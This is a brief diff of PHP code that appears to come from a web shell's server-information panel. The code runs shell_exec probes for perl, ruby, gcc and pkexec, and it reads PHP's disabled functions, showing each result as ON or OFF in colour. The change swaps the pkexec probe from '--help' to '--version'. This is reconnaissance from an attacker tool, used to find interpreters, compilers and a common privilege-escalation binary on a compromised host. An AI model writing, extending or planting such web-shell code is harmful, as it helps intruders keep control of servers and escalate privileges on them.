@@ -300,7 +300,7 @@
           $perl = (@shell_exec("perl --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
           $ruby = (@shell_exec("ruby --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
           $gcc = (@shell_exec("gcc --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
-          $pkexec = (@shell_exec("pkexec --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
+          $pkexec = (@shell_exec("pkexec --version")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
           $disfuncs = @ini_get("disable_functions");
           $showit = (!empty($disfuncs)) ? "<font color='red'>$disfuncs</font>" : "<font color='lime'>NONE</font>";
           echo "<div class='infomin wrap'>";
